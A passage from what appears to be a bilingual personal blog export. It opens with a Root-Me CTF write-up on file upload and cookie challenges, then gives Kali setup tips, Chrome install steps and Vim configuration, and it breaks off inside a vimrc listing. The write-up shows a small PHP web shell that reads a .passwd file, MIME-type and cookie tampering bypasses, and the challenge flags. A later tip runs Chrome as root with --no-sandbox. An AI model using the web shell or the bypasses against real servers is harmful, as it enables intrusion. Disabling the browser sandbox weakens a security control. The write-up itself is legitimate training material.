<p>但是flag呢？flag在哪里呀…找了一圈没找到…然后再仔细看了一遍题目才发现！!<code>Retrieve the validation password in the file .passwd at the root of the application.</code>:原来要读取的文件是应用根目录下的.passwd 文件! 晕！！！</p>
<p>唯一的问题就是不知道应用的根目录在哪一层，需要向上返回几次。这个情况下，我们就需要使用到————枚举法！！几次尝试后，最终上传的PHP脚本内容为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;cat ../../../.passwd&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样我们就可以成功获得到Flag: <code>Gg9LRz-hWSxqqUKd77-_q-6G8 </code></p>
<h2 id="File-upload-MIME-type"><a href="#File-upload-MIME-type" class="headerlink" title="File upload - MIME type"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type">File upload - MIME type</a></h2><p>这道题跟前面的题非常类似，需要达到的目的是完全一样的。所以脚本的内容应该可以不用修改。不同的应该是绕过的方式，这次需要使用到的方法不再是通过给PHP文件添加合法的后缀名。</p>
<p>尝试上传PHP脚本，使用Burp截取发送的请求，可以看到<code>Content-Type</code>的值为<code>application/x-php</code>。这个值也可以体现出上传的文件的类型。</p>
<p><img data-src="mime_type_0.png"></p>
<p>直接发送到服务器，毫无意外，被服务器拒绝了！</p>
<p><img data-src="mime_type_1.png"></p>
<p>这里我们需要做的是，让服务器端认为我们上传的文件是个人畜无害的图片文件。所以，我们需要把这个<code>Content-Type</code>的值修改为<code>image/jpeg</code>。再上传试试～</p>
<p><img data-src="mime_type_2.png"></p>
<p>Bingo～成功获取到了flag:<code>a7n4nizpgQgnPERy89uanf6T4</code>.</p>
<blockquote>
<p>要点：<br>这紧接着的两道题都是文件上传漏洞相关的题目。文件上传漏洞是一个经常被利用到的漏洞。通过这种方法，黑客可以上传一段小脚本到服务器上，一旦有办法执行这段脚本，那攻击者就可以进一步来实现对服务器的完全控制。<a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">OWASP Unrestricted File Upload</a> 有完整的对于这一个漏洞的介绍。并且说明了应该如何有效地防止此类漏洞的产生。</p>
</blockquote>
<h2 id="HTTP-Cookies"><a href="#HTTP-Cookies" class="headerlink" title="HTTP -Cookies"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/HTTP-Cookies">HTTP -Cookies</a></h2><p>题目的描述是<code>Bob created a PHP script to gather user emails</code>。看上去，这是一道利用脚本获取用户Cookie的题目。 </p>
<p>先点击进入页面了解一下这个页面的功能。用户可以输入Email地址，提交后会进行保存。页面下方还有一个<code>Saved email addresses</code>的链接，点击后会显示需要是admin才能查看。</p>
<p><img data-src="cookie_0.png"></p>
<p>那么，显而易见。我们需要做的是利用网页的漏洞，让自己变成admin身份。</p>
<p><img data-src="cookie_1.png"></p>
<p>在之前尝试的过程中，我发现在点击<code>Saved email adresses</code>链接后，url多了一个参数<code>c=visiteur</code>。所以首先对参数的值进行修改，尝试访问<code>http://challenge01.root-me.org/web-serveur/ch7/?c=visiteur</code>。</p>
<p><img data-src="cookie_2.png"></p>
<p>可以看到网页报出了一个新的错误提示：<code>Problem with cookie</code>。所以我们需要看一下该页面使用的cookie都有些什么值。查看cookie可以在浏览器中安装插件，Firefox和chrome的应用商店中都很容易找到cookie编辑的插件。查看cookie我们可以发现页面cookie中有一个名为ch7的参数。</p>
<p><img data-src="cookie_3.png"></p>
<p>OK！尝试把这个值从 <strong>visiteur</strong> 修改为 <strong>admin</strong>，并保存后重新点击链接。我们就轻易地获得到了通关密码：<code>ml-SYMPA</code>。</p>
<blockquote>
<p>要点：这个其实与HTTP头的概念类似，Cookie中的值其实也属于用户输入数据的一部分。这一点经常会被忽视。服务器要使用Cookie中的参数时，必须先要考虑到这一点，先进行输入校验再使用。将Cookie用于维持登录身份时，也要充分考虑cookie的参数可能被篡改的问题。</p>
</blockquote>
]]></content>
      <categories>
        <category>Security</category>
        <category>Web Application</category>
      </categories>
      <tags>
        <tag>Root Me</tag>
        <tag>Web Application Security</tag>
      </tags>
  </entry>
  <entry>
    <title>TODO List for New Kali</title>
    <url>/en/da9fccd6/</url>
    <content><![CDATA[<p>After you installed a new Kali (Virtual) Machine, what’s the next step? Here are some “Must Do” list to make your Kali more handy:</p>
<h2 id="Update-to-latest-version"><a href="#Update-to-latest-version" class="headerlink" title="Update to latest version"></a>Update to latest version</h2><p>First, edit the <code>/etc/apt/sources.list</code>. </p>
<span id="more"></span>


<p><code>deb http://http.kali.org/kali kali-rolling main non-free contrib</code> is the official repository for Kali. </p>
<p>And you can configure the <em>sources.list</em> based on your location.<br>For example, if you’re in China, you can use the following list:</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#中科大</span></span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#阿里云</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#清华大学</span></span><br><span class="line">deb http:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#浙大</span></span><br><span class="line">deb http:<span class="comment">//mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>It can effectively boost the package download from the internet. </p>
<p>After that, just do the upgrade! </p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># apt update</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment">#</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># apt -y full-upgrade</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Note: If you find some “failed connection” after <code>apt update</code>, then just simply remove those lines from your sources.list and do <code>apt update</code> again. It’s not worthy to spend time on figuring out why the connection is failed. </p>
</blockquote>
<p>Reboot after the full-upgrade. Then it’s the latest version of Kali on your machine.<br>You can easily check the version with commands: </p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># grep VERSION /etc/os-release</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># uname -a</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># lsb_release -ad</span></span><br></pre></td></tr></table></figure>

<h2 id="Install-Desktop-Environment"><a href="#Install-Desktop-Environment" class="headerlink" title="Install Desktop Environment"></a>Install Desktop Environment</h2><p>Starting from Kali 2019.4, the default desktop environment of Kali has been changed to Xfce (Used to be Gnome). </p>
<p>If you upgrade from a earlier version, then you might also want to migrate to Xfce. Relax, it’s easy to do. Just one line command: </p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># apt -y install kali-desktop-xfce. </span></span><br></pre></td></tr></table></figure>

<p>When you are asked to select “<em>Default display manager</em>“, select <code>lightdm</code>. </p>
<p>Up till now, the <strong>Xfce</strong> Desktop Environment has been installed on your machine. Next time when you try to login, you can select it before you submit your login password. </p>
<p>If you would like to set <strong>Xfce</strong> as the default Desktop environment on your machine, You could run </p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># update-alternatives --config x-session-manager</span></span><br></pre></td></tr></table></figure>
<p>and select <strong>Xfce</strong>‘soption. </p>
<h2 id="Add-a-new-“sudo”-user"><a href="#Add-a-new-“sudo”-user" class="headerlink" title="Add a new “sudo” user"></a>Add a new “sudo” user</h2><p>Yes, we all know it’s convenient to do everything as “root”. But it’s obviously not the best practice.<br>It’s better to create a new user for us to do daily operations…</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># adduser [yourUserName]</span></span><br></pre></td></tr></table></figure>
<ul>
<li>You will be asked to set new UNIX password.  </li>
<li>You will also be asked to provide some information. It’s okay to leave it blank.</li>
</ul>
<p>Now, a new user has been created. Then we need to add this user to <code>sudo</code> group. </p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># usermod -aG sudo [yourUserName]</span></span><br></pre></td></tr></table></figure>

<p>Good! Now it’s up to you to switch to this new created user!</p>
<h2 id="Configure-your-Vim"><a href="#Configure-your-Vim" class="headerlink" title="Configure your Vim"></a>Configure your Vim</h2><p>Refers to <a href="https://upwnothing.github.io/en/aa4adef2/">this blog</a>.</p>
<h2 id="Configure-Input-Method-For-Non-English-Speaking-Users"><a href="#Configure-Input-Method-For-Non-English-Speaking-Users" class="headerlink" title="Configure Input Method (For Non-English Speaking Users)"></a>Configure Input Method (For Non-English Speaking Users)</h2><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">richard@richard-Kali:~<span class="comment"># sudo apt install fcitx fcitx-googlepinyin</span></span><br></pre></td></tr></table></figure>
<p>Then you can open fcitx to configure your Input Method. </p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">richard<span class="symbol">@richard</span>-Kali:~<span class="meta"># fcitx-config-gtk3</span></span><br></pre></td></tr></table></figure>
<p><img data-src="./fcitx_config.png" alt="fcitx Configuration Dialog"></p>
<p>Press ‘+’ to add Google Pinyin.<br><img data-src="./add_googlepinyin.png" alt="fcitx Add Google Pinyin"></p>
<p>Now, it should work! </p>
<h2 id="Configure-Bash-Aliases"><a href="#Configure-Bash-Aliases" class="headerlink" title="Configure Bash Aliases"></a>Configure Bash Aliases</h2><p>Bash aliases can be used for creating customized command line shortcuts. For example, we can reassign the <strong>ls</strong> command. Here is how to do that:</p>
<p>Open <code>~/.bash_aliases</code> and add the following line to this file. </p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alias</span> <span class="keyword">ls</span>=&#x27;<span class="keyword">ls</span> -rthal <span class="params">--color=always</span></span><br></pre></td></tr></table></figure>

<p>Now, restart the terminal and do <code>ls</code>. </p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">richard@richard-Kali:~/Desktop$ ls                                                                                                                                         </span><br><span class="line">total 172K</span><br><span class="line">-rwxr-xr-x <span class="number"> 1 </span>richard richard 8.3K Dec<span class="number"> 14 </span>11:18 google-chrome.desktop</span><br><span class="line">-rwxr----- <span class="number"> 1 </span>richard richard  66K Jan <span class="number"> 3 </span>13:54 IMG_20200103_135404.png</span><br><span class="line">-rwxr----- <span class="number"> 1 </span>richard richard  84K Jan <span class="number"> 3 </span>13:54 IMG_20200103_135431.jpg</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>richard richard 4.0K Jan <span class="number"> 3 </span>13:56 .</span><br><span class="line">drwxr-xr-x<span class="number"> 21 </span>richard richard 4.0K Jan<span class="number"> 14 </span>14:51 ..</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The detailed information are listed by default. </p>
<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/top-10-things-do-after-installing-kali-linux-0186450/">https://null-byte.wonderhowto.com/how-to/top-10-things-do-after-installing-kali-linux-0186450/</a></li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
        <category>Tools</category>
        <category>Linux</category>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Configuration</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>在Kali Linux中安装Google Chrome浏览器，并解决root用户无法运行的问题</title>
    <url>/zh-CN/ae2cc9de/</url>
    <content><![CDATA[<p>其实，Kali Linux本身自带有Chromium浏览器。但是，如果你更倾向于使用Chrome，那么你可以通过以下步骤在Kali中安装Chrome：</p>
<h1 id="下载Chrome"><a href="#下载Chrome" class="headerlink" title="下载Chrome"></a>下载Chrome</h1><p>通过以下链接下载<code>google-chrome-stable</code>:</p>
<p><a href="https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb">https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</a></p>
<h1 id="安装Chrome"><a href="#安装Chrome" class="headerlink" title="安装Chrome"></a>安装Chrome</h1><p>使用下列命令安装Chrome：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install ./google-chrome-stable_current_amd64.deb</span><br></pre></td></tr></table></figure>

<p>一切顺利的话，到目前为止，Google Chrome已经成功地安装到了我们的Kali Linux中了。 </p>
<h1 id="解决无法以root身份运行Chrome的问题"><a href="#解决无法以root身份运行Chrome的问题" class="headerlink" title="解决无法以root身份运行Chrome的问题"></a>解决无法以root身份运行Chrome的问题</h1><p>如果当前正在以root身份登录的话，我们双击Chrome图标想要打开浏览器并不能成功。所以，尝试一下通过命令行来打开Chrome：</p>
<p><img data-src="non_root_error.png" alt="Error Message"></p>
<p>通过命令行，我们看到了具体的报错原因。知道具体的原因，那么就可以下手解决了。 </p>
<p>其实，我会更推荐在日常使用时，以非root的身份登录进行操作，这样既确保了安全，同时也变相解决了Chrome启动的问题。当然，如果你执意想要以root用户的身份运行Chrome,那也是有办法的：  </p>
<p>使用任意文档编辑工具打开 <code>/usr/bin/google-chrome</code>,在最后一行<code>exec -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$@&quot;</code> 之后加上<code>--user-data-dir</code>和<code>--no-sandbox</code>。如下图所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> -a <span class="string">&quot;<span class="variable">$0</span>&quot;</span> <span class="string">&quot;<span class="variable">$HERE</span>/chrome&quot;</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span> --user-data-dir --no-sandbox</span><br></pre></td></tr></table></figure>

<p>再次尝试，OK! Google Chrome 可以顺利运行了！</p>
]]></content>
      <categories>
        <category>Security</category>
        <category>Tools</category>
        <category>Linux</category>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Linux</tag>
        <tag>Chrome</tag>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>How to Install and Enable Google Chrome in Kali Linux</title>
    <url>/en/ae2cc9de/</url>
    <content><![CDATA[<p>Actually, Chromium Web Browser is attached with Kali Linux image. However, if you still prefer to use Chrome, then you can install the Chrome with the following steps:</p>
<p>First, download <em>google-chrome-stable</em> from the web:</p>
<p><a href="https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb">https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</a></p>
<p>Then, install it with command: </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install ./google-chrome-stable_current_amd64.deb</span><br></pre></td></tr></table></figure>

<p>Okay, now we have Chrome installed in our Kali system. </p>
<p>However, in Kali, you’re not able to run Chrome or Chromium as root. When you click on Chrome icon in GUI, Chrome will not response and open a new window. So let’s try to launch Chrome in the terminal to see what’s happening there. </p>
<p><img data-src="non_root_error.png" alt="Error Message"></p>
<p>Okay, now we know the reason why we cannot launch Chrome with root privilege. </p>
<p> I would recommend to create another user when browsing the internet. As not allowing using Chrome as root is actually a control for security reasons.<br>However, if you still want to run Chrome as root. Let’s try to find out how to bypass the limitation.</p>
<p>Edit <code>/usr/bin/google-chrome</code>:</p>
<p>Add –no-sandbox parameter to the exec line. That’s it! </p>
]]></content>
      <categories>
        <category>Security</category>
        <category>Tools</category>
        <category>Linux</category>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Linux</tag>
        <tag>Chrome</tag>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim 配置</title>
    <url>/zh-CN/b8c5a601/</url>
    <content><![CDATA[<h1 id="Vim插件管理器：Vundle安装"><a href="#Vim插件管理器：Vundle安装" class="headerlink" title="Vim插件管理器：Vundle安装"></a>Vim插件管理器：Vundle安装</h1><ol>
<li>下载Vundle<br><code>git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim</code></li>
</ol>
<span id="more"></span>

<h1 id="修改Vim配置文件-x2F-vimrc"><a href="#修改Vim配置文件-x2F-vimrc" class="headerlink" title="修改Vim配置文件 ~&#x2F;.vimrc"></a>修改Vim配置文件 ~&#x2F;.vimrc</h1><p>将下面的配置添加到<code>~/.vimrc</code>中。可以根据自己的需要添加或者移除Plugin。</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">set</span> nocompatible              <span class="comment">&quot; be iMproved, required</span></span><br><span class="line"><span class="keyword">filetype</span> off                  <span class="comment">&quot; required</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; set the runtime path to include Vundle and initialize</span></span><br><span class="line"><span class="keyword">set</span> rtp+=~/.<span class="keyword">vim</span>/bundle/Vundle.<span class="keyword">vim</span></span><br><span class="line"><span class="keyword">call</span> vundle#begin()</span><br><span class="line"><span class="comment">&quot; alternatively, pass a path where Vundle should install plugins</span></span><br><span class="line"><span class="comment">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; let Vundle manage Vundle, required</span></span><br><span class="line">Plugin <span class="string">&#x27;VundleVim/Vundle.vim&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; The following are examples of different formats supported.</span></span><br><span class="line"><span class="comment">&quot; Keep Plugin commands between vundle#begin/end.</span></span><br><span class="line"><span class="comment">&quot; plugin on GitHub repo</span></span><br><span class="line">Plugin <span class="string">&#x27;tpope/vim-fugitive&#x27;</span></span><br><span class="line">Plugin <span class="string">&#x27;Valloric/YouCompleteMe&#x27;</span></span><br><span class="line">Plugin <span class="string">&#x27;plasticboy/vim-markdown&#x27;</span></span><br><span class="line">Plugin <span class="string">&#x27;preservim/nerdtree&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; plugin from http://vim-scripts.org/vim/scripts.html</span></span><br><span class="line"><span class="comment">&quot; Plugin &#x27;L9&#x27;</span></span><br><span class="line"><span class="comment">&quot; Git plugin not hosted on GitHub</span></span><br><span class="line"><span class="comment">&quot; git repos on your local machine (i.e. when working on your own plugin)</span></span><br><span class="line"><span class="comment">&quot;Plugin &#x27;file:///home/gmarik/path/to/plugin&#x27;</span></span><br><span class="line"><span class="comment">&quot; The sparkup vim script is in a subdirectory of this repo called vim.</span></span><br><span class="line"><span class="comment">&quot; Pass the path to set the runtimepath properly.</span></span><br><span class="line">Plugin <span class="string">&#x27;rstacruz/sparkup&#x27;</span>, &#123;<span class="string">&#x27;rtp&#x27;</span>: <span class="string">&#x27;vim/&#x27;</span>&#125;</span><br><span class="line"><span class="comment">&quot; Install L9 and avoid a Naming conflict if you&#x27;ve already installed a</span></span><br><span class="line"><span class="comment">&quot; different version somewhere else.</span></span><br><span class="line"><span class="comment">&quot; Plugin &#x27;ascenator/L9&#x27;, &#123;&#x27;name&#x27;: &#x27;newL9&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; Color schemes</span></span><br><span class="line">Plugin <span class="string">&#x27;tomasr/molokai&#x27;</span></span><br><span class="line">Plugin <span class="string">&#x27;altercation/vim-colors-solarized&#x27;</span></span><br><span class="line">Plugin <span class="string">&#x27;flazz/vim-colorschemes&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; All of your Plugins must be added before the following line</span></span><br><span class="line"><span class="keyword">call</span> vundle#end()            <span class="comment">&quot; required</span></span><br><span class="line"><span class="keyword">filetype</span> plugin <span class="built_in">indent</span> <span class="keyword">on</span>    <span class="comment">&quot; required</span></span><br><span class="line"><span class="comment">&quot; To ignore plugin indent changes, instead use:</span></span><br><span class="line"><span class="comment">&quot;filetype plugin on</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot; Brief help</span></span><br><span class="line"><span class="comment">&quot; :PluginList       - lists configured plugins</span></span><br><span class="line"><span class="comment">&quot; :PluginInstall    - installs plugins; append `!` to update or just :PluginUpdate</span></span><br><span class="line"><span class="comment">&quot; :PluginSearch foo - searches for foo; append `!` to refresh local cache</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; :PluginClean      - confirms removal of unused plugins; append `!` to auto-approve removal</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot; see :h vundle for more details or wiki for FAQ</span></span><br><span class="line"><span class="comment">&quot; Put your non-Plugin stuff after this line</span></span><br><span class="line"><span class="comment">&quot; </span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="keyword">syntax</span> enable</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> fdm=marker foldlevelstart=<span class="number">99</span></span><br><span class="line"><span class="keyword">set</span> tabstop=<span class="number">4</span> softtabstop=<span class="number">0</span> expandtab <span class="built_in">shiftwidth</span>=<span class="number">2</span> smarttab</span><br><span class="line"><span class="keyword">set</span> laststatus=<span class="number">2</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">nu</span></span><br><span class="line"><span class="keyword">set</span> cursorline</span><br><span class="line"><span class="keyword">set</span> mouse=<span class="keyword">a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; Highlight Search</span></span><br><span class="line"><span class="keyword">set</span> hlsearch</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> ruler</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; NERDTree shortcut</span></span><br><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;C-t&gt;</span> :NERDTreeToggle<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;C-f&gt;</span> :NERDTreeFind<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="comment">&quot; NERDTree automation</span></span><br><span class="line"><span class="keyword">autocmd</span> VimEnter * NERDTree | <span class="keyword">wincmd</span> <span class="keyword">p</span></span><br><span class="line"><span class="keyword">autocmd</span> BufWinEnter * <span class="keyword">silent</span> NERDTreeMirror</span><br><span class="line"><span class="keyword">autocmd</span> BufEnter * <span class="keyword">if</span> <span class="built_in">tabpagenr</span>(<span class="string">&#x27;$&#x27;</span>) == <span class="number">1</span> &amp;&amp; <span class="built_in">winnr</span>(<span class="string">&#x27;$&#x27;</span>) == <span class="number">1</span> &amp;&amp; <span class="built_in">exists</span>(<span class="string">&#x27;b:NERDTree&#x27;</span>) &amp;&amp; <span class="variable">b:NERDTree</span>.isTabTree() |</span><br><span class="line">      \ <span class="keyword">quit</span> | <span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span> &gt;&gt;&gt; On startup, <span class="keyword">continue</span> where <span class="keyword">left</span> off &gt;&gt;&gt;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">has</span>(<span class="string">&quot;autocmd&quot;</span>)</span><br><span class="line">  <span class="keyword">autocmd</span> BufReadPost *</span><br><span class="line">    \ <span class="keyword">if</span> <span class="built_in">line</span>(<span class="string">&quot;&#x27;\&quot;&quot;</span>) &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">line</span>(<span class="string">&quot;&#x27;\&quot;&quot;</span>) &lt;= <span class="built_in">line</span>(<span class="string">&quot;$&quot;</span>) |</span><br><span class="line">    \   <span class="keyword">exe</span> <span class="string">&quot;normal g`\&quot;&quot;</span> |</span><br><span class="line">    \  <span class="keyword">endif</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"><span class="string">&quot;&quot;</span> &lt;&lt;&lt; On startup, <span class="keyword">continue</span> where <span class="keyword">left</span> off &lt;&lt;&lt;</span><br></pre></td></tr></table></figure>


<h1 id="下载插件"><a href="#下载插件" class="headerlink" title="下载插件"></a>下载插件</h1><p>通过<code>git clone</code>命令，将需要的插件下载到<code>~/.vim/bundle</code>目录下。<br><img data-src="plugin_download.png"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/VundleVim/</span>Vundle.vim.git ~<span class="regexp">/.vim/</span>bundle/Vundle.vim</span><br><span class="line">cd ~<span class="regexp">/.vim/</span>bundle</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/tpope/</span>vim-fugitive</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/altercation/</span>vim-colors-solarized</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Valloric/</span>YouCompleteMe</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/rstacruz/</span>sparkup</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/plasticboy/</span>vim-markdown</span><br></pre></td></tr></table></figure>

<h1 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h1><p>运行<strong>Vim</strong>,然后执行<code>:PluginInstall</code>。<br>当然也可以直接在命令行执行<code> vim +PluginInstall +qall</code></p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>Vim</category>
      </categories>
      <tags>
        <tag>Configuration</tag>
        <tag>Vim</tag>
        <tag>Vundle</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim Configuration</title>
    <url>/en/aa4adef2/</url>
    <content><![CDATA[<h1 id="Install-Vim-Plug-in-Manager：Vundle"><a href="#Install-Vim-Plug-in-Manager：Vundle" class="headerlink" title="Install Vim Plug-in Manager：Vundle"></a>Install Vim Plug-in Manager：Vundle</h1><ol>
<li>Download Vundle<br><code>git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim</code></li>
</ol>
<!--------------- more   ---------------------->


<h1 id="Configure-Vim-file-x2F-vimrc"><a href="#Configure-Vim-file-x2F-vimrc" class="headerlink" title="Configure Vim file ~&#x2F;.vimrc"></a>Configure Vim file ~&#x2F;.vimrc</h1><p>Add the following content to <code>~/.vimrc</code> file. It’s up to you to add&#x2F;remove some plug-ins.</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> nocompatible              <span class="comment">&quot; be iMproved, required</span></span><br><span class="line"><span class="keyword">filetype</span> off                  <span class="comment">&quot; required</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; set the runtime path to include Vundle and initialize</span></span><br><span class="line"><span class="keyword">set</span> rtp+=~/.<span class="keyword">vim</span>/bundle/Vundle.<span class="keyword">vim</span></span><br><span class="line"><span class="keyword">call</span> vundle#begin()</span><br><span class="line"><span class="comment">&quot; alternatively, pass a path where Vundle should install plugins</span></span><br><span class="line"><span class="comment">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; let Vundle manage Vundle, required</span></span><br><span class="line">Plugin <span class="string">&#x27;VundleVim/Vundle.vim&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; The following are examples of different formats supported.</span></span><br><span class="line"><span class="comment">&quot; Keep Plugin commands between vundle#begin/end.</span></span><br><span class="line"><span class="comment">&quot; plugin on GitHub repo</span></span><br><span class="line">Plugin <span class="string">&#x27;tpope/vim-fugitive&#x27;</span></span><br><span class="line">Plugin <span class="string">&#x27;Valloric/YouCompleteMe&#x27;</span></span><br><span class="line">Plugin <span class="string">&#x27;plasticboy/vim-markdown&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; plugin from http://vim-scripts.org/vim/scripts.html</span></span><br><span class="line"><span class="comment">&quot; Plugin &#x27;L9&#x27;</span></span><br><span class="line"><span class="comment">&quot; Git plugin not hosted on GitHub</span></span><br><span class="line"><span class="comment">&quot; git repos on your local machine (i.e. when working on your own plugin)</span></span><br><span class="line"><span class="comment">&quot;Plugin &#x27;file:///home/gmarik/path/to/plugin&#x27;</span></span><br><span class="line"><span class="comment">&quot; The sparkup vim script is in a subdirectory of this repo called vim.</span></span><br><span class="line"><span class="comment">&quot; Pass the path to set the runtimepath properly.</span></span><br><span class="line">Plugin <span class="string">&#x27;rstacruz/sparkup&#x27;</span>, &#123;<span class="string">&#x27;rtp&#x27;</span>: <span class="string">&#x27;vim/&#x27;</span>&#125;</span><br><span class="line"><span class="comment">&quot; Install L9 and avoid a Naming conflict if you&#x27;ve already installed a</span></span><br><span class="line"><span class="comment">&quot; different version somewhere else.</span></span><br><span class="line"><span class="comment">&quot; Plugin &#x27;ascenator/L9&#x27;, &#123;&#x27;name&#x27;: &#x27;newL9&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; Color schemes</span></span><br><span class="line">Plugin <span class="string">&#x27;tomasr/molokai&#x27;</span></span><br><span class="line">Plugin <span class="string">&#x27;altercation/vim-colors-solarized&#x27;</span></span><br><span class="line">Plugin <span 